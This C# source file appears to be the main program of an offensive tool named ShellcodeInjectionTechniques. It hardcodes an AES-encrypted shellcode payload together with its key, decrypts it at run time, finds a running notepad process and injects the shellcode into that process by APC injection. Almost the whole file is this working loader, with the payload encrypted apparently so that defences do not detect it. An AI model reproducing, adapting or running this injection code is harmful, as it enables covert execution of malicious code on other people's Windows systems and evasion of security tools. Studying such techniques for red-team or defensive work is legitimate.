using System;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.AesHelper;
using static ShellcodeInjectionTechniques.Debugger;

namespace ShellcodeInjectionTechniques
{
    class Program
    {
        static void Main(string[] args)
        {
            // change these to your own encrypted payload and key
            // https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs
            string payload = "WVb3HI0UaPpQ18lmombD8ZeDjINeSdFHNOko2wuUGzWVYs5fWVRRGeXSHz9ZmucJl2F700GsGriY7gVeMmklepRxqHdD5whRJ4at8UI41VjkF98zGEq3Lqo5cyc766tOhjqzcOYZUmgJDRNgk7CpDTBcjiEr64Fb1lKsXCZQGEjTFlzmX01Xchw6Ru5t/P4VrD8IMsevr9WaOZQlk6K5hXdjpg/lbZRKuwuntaQQXs+g5IYwDANO4qtMWYp4BuGq7s1QQWN+S88iQReDHEKpjI6abY+XMQb9eTdF+zuEN+g+utJcFWXtFBhnJrbyEgho0AhZemR39Xv7+wbhbi2fGMOv/7ZenBEMYwEqYi0+rdnGxGeYQLo29PSDhl4jBi5g4fM14oXNLMCxJIyRkXqTKnHU4mY3U1AmyqNQhYxLh6FpQ32CEL10ANDmSojsMlZ0pOiEcPhpGRLG+4kg0dkQ66A560cRbXYen+hAx613K8L3T1I2/W0VBY5OgWFDgf+hWtQVcNZxsDzuAVDcdwPD7a1I+R0xuOSgB7+CldmHjhZ7nguQMiy2WcOCGgAVjq0Fowu+EAzgKEh78BglvGDINAUARMsxyjMZw5Uwi6cCVXK2lsMY00/oxZgTdc7WKLmmDO80pkh8XpBIre6Ib2Kw4Qo/0WC/uq8gaqLf/pe6not67iN3nN6MXCgmle92icuvewzDyFT/A1MO/yflZToqm6Yr6DOx/0I9aDHo1KxNGYmWrWLox6Y8LNvNjTmHLEStSXyKgoUEFVAvwP2T8Do+aY4KSje/JnZGyczncAamc6NlnIWUFJ86jV07NM+mR9zNOAZJCQmko5x2O9HPli+iVOaTgovHbVbNzbHqF1bRRS0FyvlBTV+lOysiFhdYyuVoPFmXGtTXaafqe97s9DzLiDhuAayXRsxR8wqRmuPvXQ3F1dcLWDAIdq30cNz3cwl/55wSzuKnP73oO/M2gHrxlUopQU0SNItpBslorpGcSpKIGlYZqzSH+f2AYaUjW+0SbM5xt/8PYSNenaR8aU350Q==";
            string key = "aVUMevwE6uiXCKXYzQuRGYgLQYX7aycE";

            byte[] shellcode = Decrypt(key, payload);

            // get the process to target
            Process target = null;
            
            
            Process[] processes = Process.GetProcessesByName("notepad");

            if(processes.Length == 0)
            {
                Debug("[!] Unable to find process to inject into!");
                return;
            }

            Debug("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
            target = processes[0];
            
                
            // instantiate the chosen technique
            ITechnique teckers = new APCInjection();
            Debug("[+] Using technique: {0}", new string[] { teckers.GetType().ToString() });

            // send the shellcode to the chosen technique to run
            teckers.Run(target, shellcode);

            // for debugging
#if DEBUG
            Console.ReadLine();
#endif
        }
    }
}
